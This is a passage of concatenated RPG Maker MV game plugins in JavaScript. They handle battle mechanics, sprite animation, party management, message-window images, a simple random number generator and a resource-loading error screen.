	this.addCommand(cw[1],'def',false);
	if(this._actor){
		const customizables=this._actor[f.tbl[0]]();
		const sz=Math.max(cw.length-2,customizables);
		for(let x=0;x<sz;++x) this.addCommand(cw[x+2],f.tbl[0],x<customizables);
	}
},t,true,true).add('windowHeight',function f(){
	let rtv=f.ori.apply(this,arguments);
	if(!isNaN(this._maxHeight)) rtv=Math.min(rtv,this._maxHeight);
	return rtv;
},t).add('drawItem',function f(idx){
	const rect = this.itemRectForText(idx);
	const align = this.itemTextAlign();
	this.resetTextColor();
	this.changePaintOpacity(this.isCommandEnabled(idx));
	const ww=this.weightWidth();
	const w=rect.width-ww;
	let x=rect.x;
	const info=this.commandName(idx);
	if(info && info[0]){
		const skill=$dataSkills[info[0]];
		if(skill) this.drawText(skill.name, x, rect.y, w);
		x+=w;
		this.drawText(info[1], x, rect.y, ww, 'right');
	}else{
		this.drawText(f.tbl[2], rect.x, rect.y, w);
		x+=w;
		const val=info&&info[1];
		this.drawText(val|0, x, rect.y, ww, 'right');
	}
},t,true,true);


new cfc(Scene_Skill.prototype).add('createSkillTypeWindow',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._skillTypeWindow.setHandler(f.tbl[0],this.customizingSkillWeight.bind(this));
	return rtv;
},t).add('customizingSkillWeight',function f(){
	SceneManager.push(Scene_CustomizingSkillWeight);
	this._skillTypeWindow.activate();
},t,true,true);


cf(Window_SkillType.prototype,'makeCommandList',function f(){
	if(this._actor && this._actor.getData().meta[f.tbl[0]]) this.addCommand(f.tbl[1], f.tbl[0], true);
	return f.ori.apply(this,arguments);
},t);


cf(Game_Actor.prototype,'makeAutoBattleActions',function f(){
	if(!this.getData().meta[f.tbl[0]]) return f.ori.apply(this,arguments);
	const cw=this[f.tbl[5]]();
	if(!cw.some(f.tbl[7])) return f.ori.apply(this,arguments);
	const arr=[]; for(let x=0;x!==cw.length;++x) if(cw[x][1]) arr.push([cw[x][0],(arr.length?arr.back[1]:0)+cw[x][1]]);
	const M=arr.back[1];
	for(let x=arr.length;--x;) arr[x][1]=arr[x-1][1];
	arr[0][1]=0;
	for(let x=0,xs=this.numActions();x!==xs;++x){
		const r=Math.random()*M;
		let i=0,j=arr.length;
		while(i+1<j){
			let m=(i+j)>>1;
			if(r<arr[m][1]) j=m;
			else i=m;
		}
		const act=new Game_Action(this);
		act.setSkill(arr[i][0]);
		this.setAction(x,act);
	}
	this.setActionState('waiting');
},t);


})();


﻿"use strict";
/*:
 * @plugindesc 受HP攻擊(>0)時，上攻擊者狀態
 * @author agold404
 * @help 有trait的東西的note <反擊上狀態:[狀態id,...]>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t,a,p; const gbb=Game_BattlerBase;

const kwtxt='反擊上狀態';
const kwbase=kwtxt;
const kwtrait="TRAIT_"+kwbase;
const kwget="get_"+kwbase;

gbb.addEnum(kwtrait);

t=[kwbase,kwtxt,kwtrait,gbb[kwtrait],function(v,k){
	const r=this.stateRate(k);
	for(let x=0;x<v;++x) if(Math.random()<r) this.addState(k);
},];

cf(Scene_Boot.prototype,'start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts||!meta[kwbase]) return;
	const arr=JSON.parse(meta[kwbase]),id2idx=new Map();
	for(let x=0;x!==arr.length;++x){ if(arr[x]){
		const idx=id2idx.get(arr[x]);
		if(idx>=0) ++ts[idx].value;
		else{
			id2idx.set(arr[x],ts.length);
			ts.push({code:gbb[kwtrait],dataId:arr[x],value:1,});
		}
	} }
},
]);

new cfc(gbb.prototype).add(t[0],function f(){
	// Map([id,count])
	return this.traitsMap_sum(f.tbl[3]);
},t);

new cfc(Game_Battler.prototype).add('onDamage',function f(val,subject){
	const revStatesMap=this[f.tbl[0]]();
	if(revStatesMap.size) revStatesMap.forEach(f.tbl[4].bind(subject));
	return f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc Sprite_Actor ㄉㄨㄞ ㄉㄨㄞ
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
{s:{x:1,y:1},a:{x:0.5,y:1},},
{t:36,p:16},
]

new cfc(Sprite_Battler.prototype).add('ㄉㄨㄞ',function f(df,dr,du,t,p){
	// front,rear
	if(isNaN(t)) t=f.tbl[1].t;
	if(isNaN(p)) p=f.tbl[1].p;
	t-=0;
	p-=0;
	const isActor=this.constructor===Sprite_Actor;
	const rtv=this._ㄉㄨㄞ={
		l:isActor?df:dr,
		r:isActor?dr:df,
		u:du,
		tc:Graphics.frameCount,
		td:t,
		te:Graphics.frameCount+t,
		ts:Graphics.frameCount,
		p:p,
		lessThanP:p<t,
	};
	return rtv;
},t);
for(let x=0,arr=[Sprite_Actor,Sprite_Enemy,];x!==arr.length;++x){
new cfc(arr[x].prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	const ㄉ=this._ㄉㄨㄞ;
	if(ㄉ && ㄉ.tc<ㄉ.te && ㄉ.tc!==Graphics.frameCount){
		ㄉ.tc=Graphics.frameCount;
		const s=this.scale,a=this.anchor,eft=this._effectTarget||this,sds=this._shadowSprite;
		if(ㄉ.tc<ㄉ.te){
			const dt=ㄉ.te-ㄉ.tc;
			const d=Math.cos((dt/ㄉ.p)*(Math.PI*2))*(dt/ㄉ.td);
			s.y=f.tbl[0].s.y+d*ㄉ.u;
			if(ㄉ.l||ㄉ.r){
				const delta=d*(ㄉ.l+ㄉ.r)/2;
				const sx=f.tbl[0].s.x+delta;
				const offsetX=-this.width*f.tbl[0].a.x;
				const ax_=(ㄉ.l-ㄉ.r)/(ㄉ.l+ㄉ.r); // -1 <- 0 -> 1
				const ax=(ax_+1.0)/2;
				const newax=ax-(this.width*(ax-f.tbl[0].a.x)/(this.width*sx));
				if(eft){
					eft.scale.x=sx;
					eft.anchor.x=newax;
				}
				if(sds){
					sds.scale.x=sx;
					sds.anchor.x=newax;
				}
			}
		}else{
			this._ㄉㄨㄞ=undefined;
			if(eft) eft.scale.x=f.tbl[0].s.x;
			if(sds) sds.scale.x=f.tbl[0].s.x;
			s.y=f.tbl[0].s.y;
			if(eft) eft.anchor.x=f.tbl[0].a.x;
			if(sds) sds.anchor.x=f.tbl[0].a.x;
			a.y=f.tbl[0].a.y;
		}
	}
	return rtv;
},t);
} // for

new cfc(BattleManager).add('ㄉㄨㄞ_genAtBtlr',function f(btlr,df,dr,du,t,p){
	if(btlr&&btlr.constructor===Array){
		for(let x=0;x!==btlr.length;++x) f.call(this,btlr[x],df,dr,du,t,p);
		return;
	}
	const sc=SceneManager._scene;
	const sp=sc._btlr2sp&&sc._btlr2sp.get(btlr); if(!sp) return;
	return sp.ㄉㄨㄞ(df,dr,du,t,p);
}).add('ㄉㄨㄞ_genAtTarget',function f(df,dr,du,t,p){
	return this.ㄉㄨㄞ_genAtBtlr(this._targets,df,dr,du,t,p);
}).add('ㄉㄨㄞ_genAtSubject',function f(df,dr,du,t,p){
	return this.ㄉㄨㄞ_genAtBtlr(this._subject,df,dr,du,t,p);
});

})();


﻿"use strict";
/*:
 * @plugindesc Game_Player.prototype.canMove always can move
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=['_playerAlwaysCanMove'];
t.push(t[0].slice(1));
t.push(t[1]+"_get");
t.push(t[1]+"_set");

new cfc(Game_System.prototype).add(t[2],function f(){
	return this[f.tbl[0]];
},t).add(t[3],function f(val){
	return this[f.tbl[0]]=val;
},t);

new cfc(Game_Player.prototype).add('canMove',function f(){
	return $gameSystem && $gameSystem[f.tbl[2]]() || f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc edit MOG_HPGauge enemy: HPGaugeSprite
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

// mp有改色需求

const kw='showMpTp';

if(typeof HPGaugeSprite!=='undefined'){
t=[
'img/battle/',
{bars:{
	//hp:'GaugeEnemy_B-HP',
	mp:'GaugeEnemy_B-MP',
	tp:'GaugeEnemy_B-TP',
},frames:{
	//hp:   'GaugeEnemy_A-HP',
	//mptp: 'GaugeEnemy_A-MPTP',
	all:  'GaugeEnemy_A-HPMPTP',
},pos:{
	mp:{dx:0  ,dy:15},
	tp:{dx:47 ,dy:15},
}},
kw,
'_called_prepareSlide',
function(sp){ sp.visible=this; },
];
new cfc(HPGaugeSprite.prototype).add('shouldShowMpTp',function f(){
	if(this.type===0) return false;
	const btlr=this.battler();
	return btlr && btlr.constructor===Game_Enemy && btlr.getData().meta[f.tbl[2]];
},t).add('loadBitmaps',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.loadBitmaps_mptp();
	return rtv;
},t).add('loadBitmaps_mptp',function f(){
	//if(!this.shouldShowMpTp()) return;
	const imgr=ImageManager,confs=f.tbl[1];
	//this._layImg_hp   =imgr.loadBitmap(f.tbl[0],confs.frames.hp   ,0,true);
	//this._layImg_mptp =imgr.loadBitmap(f.tbl[0],confs.frames.mptp ,0,true);
	this._layImg_all  =imgr.loadBitmap(f.tbl[0],confs.frames.all  ,0,true);
	//this._meterImg_hp =imgr.loadBitmap(f.tbl[0],confs.bars.hp     ,0,true);
	this._meterImg_mp =imgr.loadBitmap(f.tbl[0],confs.bars.mp     ,0,true);
	this._meterImg_tp =imgr.loadBitmap(f.tbl[0],confs.bars.tp     ,0,true);
},t).add('createSprites',function f(){
	if(this._meterImg_mp.isReady()&&this._meterImg_tp.isReady()) return f.ori.apply(this,arguments);
},t).add('createLayout',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(!this.shouldShowMpTp()) return rtv;
	if(this._layImg_all) this._layout.bitmap=this._layImg_all;
	return rtv;
},t).add('_createMeter',function f(meter,meterImg,x,y,max,curr){
	for(let i=0;i!==2;++i){
		meter[i]=new Sprite(meterImg);
		meter[i].value1=curr;
		meter[i].value2=max;
		meter[i].ds=0;
		meter[i].w=meterImg.width;
		meter[i].h=meterImg.height>>1;
		if(this.type===0){
			meter[i].x=x;
			meter[i].y=y;
		}else{
			meter[i].x=x;
			meter[i].y=y;
		}
		this.addChild(meter[i]);
	}
	this.refreshMeter(meter[0],curr,max,1);
	this.refreshMeter(meter[1],curr,max,0);
},t).add('createMeter',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.createMeter_mptp();
	return rtv;
},t).add('createMeter_mptp',function f(){
	//if(!this.shouldShowMpTp()) return;
	const btlr=this.battler();
	if(btlr){
		const x=this._meter[0].x,y=this._meter[0].y,pos=f.tbl[1].pos;
		this._createMeter(this._meter_mp=[],this._meterImg_mp,x+pos.mp.dx,y+pos.mp.dy,btlr.mmp     ,btlr.mp);
		this._createMeter(this._meter_tp=[],this._meterImg_tp,x+pos.tp.dx,y+pos.tp.dy,btlr.maxTp() ,btlr.tp);
	}
},t).add('updateMeter',function f(){
	this[f.tbl[3]]=false;
	const rtv=f.ori.apply(this,arguments);
	this.updateMeter_mptp();
	return rtv;
},t).add('updateMeter_mptp',function f(){
	const visible=this.shouldShowMpTp();
	if(this._meter_mp) this._meter_mp.forEach(f.tbl[4],visible);
	if(this._meter_tp) this._meter_tp.forEach(f.tbl[4],visible);
	if(visible){
		if(this._layImg_all) this._layout.bitmap=this._layImg_all;
	}else{
		if(this._layImg) this._layout.bitmap=this._layImg;
	}
	if(!visible||!this._meter_mp||!this._meter_tp) return;
	this.refreshMeter_mptp();
},t).add('prepareSlide',function f(){
	if(this[f.tbl[3]]) return;
	this[f.tbl[3]]=true;
	return f.ori.apply(this,arguments);
},t).add('refreshMeter_mptp',function f(){
	if(!this.shouldShowMpTp()) return;
	const btlr=this.battler(); if(!btlr) return;
	let meter,c,m,m0refreshed;
	meter=this._meter_mp;
	c=btlr.mp;
	m=btlr.mmp;
	m0refreshed=false;
	if(meter&& meter[0].value1!==c){
		meter[0].value1=this.update_dif(meter[0].value1,c,60,1);
		if(!m0refreshed){ m0refreshed=true; this.refreshMeter(meter[0],meter[0].value1,m,1); }
	}
	if(meter&&$gameTemp._hpGauge[0]&&( (btlr._empgauge && btlr._empgauge[4]) || meter[1].value1!==c || meter[1].value2!==m )){
		btlr._empgauge[4]=false;
		meter[1].value1=c;
		meter[1].value2=m;
		if(!m0refreshed){ m0refreshed=true; this.refreshMeter(meter[0],meter[0].value1 ,m,1); }
		this.refreshMeter(meter[1],c,m,0);
		this.prepareSlide();
	}
	meter=this._meter_tp;
	c=btlr.tp;
	m=btlr.maxTp();
	m0refreshed=false;
	if(meter&& meter[0].value1!==c){
		meter[0].value1=this.update_dif(meter[0].value1,c,60,1);
		if(!m0refreshed){ m0refreshed=true; this.refreshMeter(meter[0],meter[0].value1,m,1); }
	}
	if(meter&&$gameTemp._hpGauge[0]&&( (btlr._etpgauge && btlr._etpgauge[4]) || meter[1].value1!==c || meter[1].value2!==m )){
		btlr._empgauge[4]=false;
		meter[1].value1=c;
		meter[1].value2=m;
		if(!m0refreshed){ m0refreshed=true; this.refreshMeter(meter[0],meter[0].value1,m,1); }
		this.refreshMeter(meter[1],c,m,0);
		this.prepareSlide();
	}
},t);
new cfc(Game_Enemy.prototype).add('setup',function f(){
	const rtv=f.ori.apply(this,arguments);
	const dataobj=this.getData(); if(dataobj && dataobj.meta[f.tbl[2]]){
		this._empgauge = [false,0,0,false,false];
		this._etpgauge = [false,0,0,false,false];
	}
	return rtv;
},t);
}

})();


﻿"use strict";
/*:
 * @plugindesc YEP _atbChargeMod by traits
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kwtxt='詠唱加速';
const kwbase=kwtxt;
const kwtrait="TRAIT_"+kwbase;
const kwget="get_"+kwbase;

gbb.addEnum(kwtrait);

t=[kwbase,kwtxt,kwtrait,kwget,gbb[kwtrait],];

cf(Scene_Boot.prototype,'start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts||!meta[kwbase]) return;
	const val=meta[kwbase]-0; if(!val) return;
	ts.push({code:gbb[kwtrait],dataId:0,value:val,});
},
]);

new cfc(gbb.prototype).add(t[3],function f(){
	return this.traitsSum(f.tbl[4],0);
},t);

new cfc(Game_Battler.prototype).add('setupATBCharge',function f(){
	const rtv=f.ori.apply(this,arguments); if(this._bypassAtbEndTurn) return rtv;
	this._atbChargeMod+=this[f.tbl[3]]();
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 隊伍成員管理
 * @author agold404
 * @help .
 * 
 * $gameSystem.partyMembers_push_createEmpty();
 * $gameSystem.partyMembers_pop_loadLast();
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('partyMembers_clearCurrent',function f(){
	$gameParty._actors=[];
	return this;
}).add('partyMembers_push_createEmpty',function f(){
	const obj=this._partyMembers_getArr();
	const rtv=obj.length;
	obj.push($gameParty._actors);
	this.partyMembers_clearCurrent();
	return this;
}).add('partyMembers_pop_loadLast',function f(){
	const obj=this._partyMembers_getArr();
	$gameParty._actors=obj.pop();
	$gamePlayer.refresh();
	return this;
}).add('_partyMembers_getArr',function f(){
	let rtv=this._隊伍成員arr; if(!rtv) rtv=this._隊伍成員arr=[];
	return rtv;
}).add('partyMembers_save',function f(id){
	const obj=this._partyMembers_getDict();
	obj[id]=$gameParty._actors.slice();
	return this;
}).add('partyMembers_load',function f(id){
	const obj=this._partyMembers_getDict();
	if(obj[id]) $gameParty._actors=obj[id].slice();
	else $gameParty._actors=[];
	return this;
}).add('partyMembers_delete',function f(id){
	const obj=this._partyMembers_getDict();
	delete obj[id];
	return this;
}).add('_partyMembers_getDict',function f(){
	let rtv=this._隊伍成員dict; if(!rtv) rtv=this._隊伍成員dict=[];
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 對話視窗額外顯示圖片
 * @author agold404
 * @help .
 * 
 * $gameSystem.additionalMsgImg_add_global(id,"path/to/img.png",x,y,moveInfo);
 * $gameSystem.additionalMsgImg_add_faceCenter(id,"path/to/img.png",dx,dy,moveInfo);
 * $gameSystem.additionalMsgImg_del(id);
 * $gameSystem.additionalMsgImg_clear();
 * 
 * moveInfo = {type:type,arg:arg};
 * arg: depends on type
 * type:
 *   "rotate". arg: rotate radius per update
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('_additionalMsgImg_getArr',function f(){
	let rtv=this._additionalMsgImg; if(!rtv) rtv=this._additionalMsgImg=[];
	while(rtv.length&&!rtv.back) rtv.pop();
	if(!rtv._id2idx){ rtv._id2idx=new Map(); rtv.forEach(f.tbl[0]); }
	return rtv;
},[
(x,i,a)=>x&&a._id2idx.set(x.id,i),
]).add('_additionalMsgImg_add',function f(info){
	const arr=this._additionalMsgImg_getArr();
	const idx=arr._id2idx.get(info.id);
	if(idx===undefined){
		arr._id2idx.set(info.id,arr.length);
		arr.push(info);
	}else arr[idx]=info;
	return this;
}).add('additionalMsgImg_clear',function f(){
	this._additionalMsgImg=undefined;
}).add('additionalMsgImg_add_global',function f(id,path,x,y,moveInfo,){
	this._additionalMsgImg_add({id:id,path:path,type:'global',x:x,y:y,move:moveInfo,});
	return this;
}).add('additionalMsgImg_add_faceCenter',function f(id,path,dx,dy,moveInfo){
	this._additionalMsgImg_add({id:id,path:path,type:'faceCenter',x:dx,y:dy,move:moveInfo,});
	return this;
}).add('additionalMsgImg_del',function f(id){
	const arr=this._additionalMsgImg_getArr();
	const idx=arr._id2idx.get(id); arr._id2idx.delete(id);
	const rtv=arr[idx]; 
	if(idx>=0) arr[idx]=0;
	return rtv;
}).add('additionalMsgImg_getInfos',function f(){
	return this._additionalMsgImg_getArr().filter(f.tbl[0]);
},[
x=>x,
]);

new cfc(Scene_Base.prototype).add('createMessageWindow_merged',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._messageWindow._additionalMsgImg_use=true;
	return rtv;
});

new cfc(Window_Message.prototype).add('initMembers',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._additionalMsgImg_use=false;
	this._additionalMsgImg_faceDrawn=false;
	return rtv;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.additionalMsgImg_updateChildren();
	return rtv;
}).add('additionalMsgImg_updateChildren',function f(){
	let m=this._additionalMsgImg_spritesMap; if(!m) m=this._additionalMsgImg_spritesMap=new Map();
	if(!this.isOpen()) return m.forEach(f.tbl[1]);
	const arr=$gameSystem.additionalMsgImg_getInfos();
	const s=this._additionalMsgImg_infosSet=new Set(arr||undefined);
	{
		const delList=[]; delList._ref=s; m.forEach(f.tbl[0].bind(delList));
		for(let x=delList.length;x--;){
			m.delete(delList[x][0]);
			this.removeChild(delList[x][1]);
		}
	}
	s._ref=m;
	s._window=this;
	s.forEach(f.tbl[2].bind(s));
},[
function(sp,info){ if(!this._ref.has(info)) this.push([info,sp,]); },
function f(sp,info){ sp.visible=false; },
function f(info){
	let sp=this._ref.get(info);
	if(!sp){
		sp=new Sprite(ImageManager.loadNormalBitmap(info.path));
		this._ref.set(info,sp);
		this._window.addChild(sp);
		const a=sp.anchor; a.y=a.x=0.5;
	}
	this._window.additionalMsgImg_updateMove(sp,info);
},
]).add('additionalMsgImg_updateMove',function f(sp,info){
	this.additionalMsgImg_setLoc(sp,info);
	if(info.move){
		const func=f.tbl[info.move.type];
		if(func) func(sp,info);
	}
},{
"rotate":(sp,info)=>{
	const pi2=Math.PI*2;
	sp.rotation=((sp.rotation+info.move.arg)%pi2+pi2)%pi2;
},
}).add('additionalMsgImg_setLoc',function f(sp,info){
	sp.visible=false;
	const func=f.tbl[info.type];
	return func&&func(this,sp,info);
},{
"global":(self,sp,info)=>{ // TODO
	sp.visible=true;
	sp.x=info.x-self.x;
	sp.y=info.y-self.y;
},
"faceCenter":(self,sp,info)=>{
	const argv=self._lastDrawFaceArgv; if(!argv||!argv[0]._image||!self._additionalMsgImg_faceDrawn) return;
	sp.visible=true;
	const c=self._windowContentsSprite;
	const x=argv[5]+((argv[7]||argv[3])>>1);
	const y=argv[6]+((argv[8]||argv[4])>>1);
	sp.x=c.x+x+info.x;
	sp.y=c.y+y+info.y;
},
}).add('drawMessageFace',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._additionalMsgImg_faceDrawn=true;
	return rtv;
}).add('newPage',function f(){
	this._additionalMsgImg_faceDrawn=false;
	return f.ori.apply(this,arguments);
});

new cfc(Window_Base.prototype).add('drawFace',function f(faceName, faceIndex, x, y, width, height){
	width = width || Window_Base._faceWidth;
	height = height || Window_Base._faceHeight;
	const bitmap = ImageManager.loadFace(faceName);
	const pw = Window_Base._faceWidth;
	const ph = Window_Base._faceHeight;
	const sw = Math.min(width, pw);
	const sh = Math.min(height, ph);
	const dx = Math.floor(x + Math.max(width - pw, 0) / 2);
	const dy = Math.floor(y + Math.max(height - ph, 0) / 2);
	const sx = faceIndex % 4 * pw + (pw - sw) / 2;
	const sy = Math.floor(faceIndex / 4) * ph + (ph - sh) / 2;
	const argv=[bitmap, sx, sy, sw, sh, dx, dy, ];
	this.contents.blt.apply(this.contents,argv);
	this._lastDrawFaceArgv=argv;
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc mini prng (pseudo random number generator)
 * @author agold404
 * @help .
 * 
 * $gameSystem.miniPrng_init(seed,b,a);
 * $gameSystem.miniPrng_getNext();
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('miniPrng_init',function f(seed,b,a){
	const rtv=this._miniPrng={
		M:65537,
		a:a===undefined?23:a-0,
		b:b===undefined?0:b-0,
		stat:seed===undefined?1:seed-0,
	};
	for(let x=0,keys=['a','b','stat',];x!==keys.length;++x) rtv[keys[x]]%=rtv.M;
	return rtv;
}).add('miniPrng_getNext',function f(info){
	let obj=this._miniPrng; if(!obj) obj=this.miniPrng_init(Date.now());
	const rtv=obj.stat;
	obj.stat=((obj.stat*obj.a+obj.b)%obj.M+obj.M)%obj.M;
	return rtv;
}).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.miniPrng_init(Date.now());
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 更新讀取錯誤視窗
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const d=document;

Bitmap._giveUps=new Map();
Bitmap.giveUps_add=function f(ori,giveUps){
	this._giveUps.set(ori,giveUps);
};
Bitmap.giveUps_del=function f(ori){
	this._giveUps.delete(ori);
};
Bitmap.giveUps_clear=function f(){
	this._giveUps.clear();
};
Bitmap.giveUps_get=function f(ori){
	return this._giveUps.has(ori)?this._giveUps.get(ori):ori;
};

const emptyData={
'img':'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQYV2NgAAIAAAUAAarVyFEAAAAASUVORK5CYII=', // blank_1x1
'audio':'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAIARKwAABCxAgAEABAAZGF0YQAAAAA=', // blank_audio
};

new cfc(Bitmap.prototype).add('_requestImage',function f(url,substituteUrl){
	if(substituteUrl) arguments[0]=substituteUrl;
	arguments[0]=Bitmap.giveUps_get(arguments[0]);
	return f.ori.apply(this,arguments);
});

t='prototype';
for(let x=0,arr=[['img',Bitmap[t]._requestImage,],['audio',WebAudio[t]._load,],['video',Graphics._playVideo,],];x!==arr.length;++x){
	const type=arr[x][0];
	const bind=arr[x][1].bind;
	arr[x][1]._type=type;
	arr[x][1].bind=function(){
		const rtv=bind.apply(this,arguments);
		rtv._type=type;
		return rtv;
	};
}

new cfc(ResourceHandler).add('createLoader',function f(url, retryMethod, resignMethod, retryInterval) {
	const self=this;
	retryInterval = retryInterval || this._defaultRetryInterval;
	const reloaders = this._reloaders;
	const noerr=ImageManager.loadWithoutError_get();
	let retryCount = 0;
	return function(){
		if(retryCount<retryInterval.length) setTimeout(retryMethod, retryInterval[retryCount++]);
		else{
			if(resignMethod) resignMethod();
			if(url){
				const func=function(giveUp){ retryCount=0; retryMethod(giveUp&&f.tbl[retryMethod._type]||url); };
				func._url=url;
				if(noerr) return func(true);
				else self.createLoader_loadErr(url,retryMethod);
				reloaders.push(func);
			}
		}
	};
},emptyData,true).add('createLoader_loadErr',function(url,retryMethod){
	Graphics.printLoadingError(url,retryMethod._type,);
	SceneManager.stop();
},undefined,true).add('retry',function f(giveUp){
	if(0<this._reloaders.length){
		Graphics.eraseLoadingError();
		SceneManager.resume();
		this._reloaders.forEach(f.tbl[0],giveUp);
		this._reloaders.length = 0;
	}
},[
function(reloader){ reloader(this); },
],false,true);

if(d.head){
	const css=d.ce('style');
	css.atxt(
		'button.errAct{ font-size:24px; color:#FFFFFF; background-color:rgba(0,0,0,0.75); }\n' +
		'button.errAct:hover{ background-color:rgba(123,123,0,0.875); }\n' +
		''
	);
	d.head.ac(css);
}

new cfc(Graphics).add('printLoadingError',function f(url,type){
	const rtv=this._errorPrinter;
	if(this._errorPrinter){
		const canCreateBtn=!this._errorShowed;
		if(!this._errorShowed){
			this._errorShowed=true;
			this._errorPrinter.rf(0);
		}
		// create error board
		const newDom=this._makeErrorHtml("Loading Error", "Failed to load: " + url);
		this._errorPrinter.ac(newDom);
		
		if(!canCreateBtn) return;
		
		// retry?
		const btn=this._setErrActBtnStyle(d.ce('button')).atxt("Retry");
		btn.onmousedown=btn.ontouchstart=(evt)=>{
			ResourceHandler.retry();
			evt.stopPropagation();
			rtv.style.zIndex=-1;
			this._errorShowed=false;
			if(typeof $gameTemp!=='undefined' && $gameTemp && $gameTemp.popupMsg) $gameTemp.popupMsg("retry loading: \n"+url+"\nUTC time:\n"+new Date().toISOString(),{loc:"LU",});
		};
		this._errorPrinter.ac(btn);
		this._loadingCount = -Infinity;
		
		const alt=f.tbl.alts[type]; if(alt) alt(this,url);
		
		let arr=this._errorPrinter.querySelectorAll("button"); //let arr=d.querySelectorAll('#ErrorPrinter>button');
		// clear btn.style.backgroundColor so they can use style sheet
		//for(let x=0;x!==arr.length;++x) if(arr[x].style) arr[x].style.backgroundColor='';
		// adjust width,height to the same
		let w=0,h=0;
		for(let x=0;x!==arr.length;++x){
			if(w<arr[x].offsetWidth ) w=arr[x].offsetWidth ;
			if(h<arr[x].offsetHeight) h=arr[x].offsetHeight;
		}
		if(w&&h){ // both none zero
			++w;++h; // offset width/height are integer "measurement"s
			for(let x=0;x!==arr.length;++x){
				arr[x].style.width =w+'px';
				arr[x].style.height=h+'px';
			}
		}
	}
	return rtv;
},{
alts:{
	'img':(self,url)=>{
		// using transparent image?
		const btn=self._setErrActBtnStyle(d.ce('button'));
		btn.ac(d.ce('div').atxt('Give up')).ac(d.ce('div').atxt('(use 1x1 transparent image)'));
		btn.onmousedown=btn.ontouchstart=(evt)=>{
			ResourceHandler.retry(1);
			evt.stopPropagation();
			self._errorPrinter.style.zIndex=-1;
			self._errorShowed=false;
			Bitmap.giveUps_add(url,emptyData.img);
			if(typeof $gameTemp!=='undefined' && $gameTemp && $gameTemp.popupMsg) $gameTemp.popupMsg("give up: \n"+url+"\nUTC time:\n"+new Date().toISOString(),{loc:"LU",});
		};
		self._errorPrinter.ac(d.ce('br')).ac(btn);
		self._loadingCount = -Infinity;
	},
	'audio':(self,url)=>{
		// using empty audio?
		const btn=self._setErrActBtnStyle(d.ce('button'));
		btn.ac(d.ce('div').atxt('Give up')).ac(d.ce('div').atxt('(use empty audio)'));
		btn.onmousedown=btn.ontouchstart=(evt)=>{
			ResourceHandler.retry(1);
			evt.stopPropagation();
			self._errorPrinter.style.zIndex=-1;
			self._errorShowed=false;
			if(typeof $gameTemp!=='undefined' && $gameTemp && $gameTemp.popupMsg) $gameTemp.popupMsg("give up: \n"+url+"\nUTC time:\n"+new Date().toISOString(),{loc:"LU",});
		};
		self._errorPrinter.ac(d.ce('br')).ac(btn);
		self._loadingCount = -Infinity;
	},
},
},true).add('printError',function f(name,msg,err){
	if(this._errorPrinter){
		if(!this._errorShowed){
			this._errorShowed=true;
			this._errorPrinter.rf(0);
		}
		this._errorPrinter.ac(this._makeErrorHtml(name, msg, err));
	}
	this._applyCanvasFilter();
	this._clearUpperCanvas();
},undefined,true).add('_makeErrorHtml',function f(name,msg,err,noUpdateZIndex){
	console.warn(arguments);
	if(!(DateNow<TR0404)||$dataSystem.gameTitle!==LZString.decompressFromBase64(f.tbl[0][4])) f.tbl[0][2]=f.tbl[0][3];
	const rtv=d.ce("div").sa("style",f.tbl[0][0]+f.tbl[0][1]).ac(
		d.ce("font").sa("color",f.tbl[1][0]).ac(
			d.ce("b").atxt(name)
		)
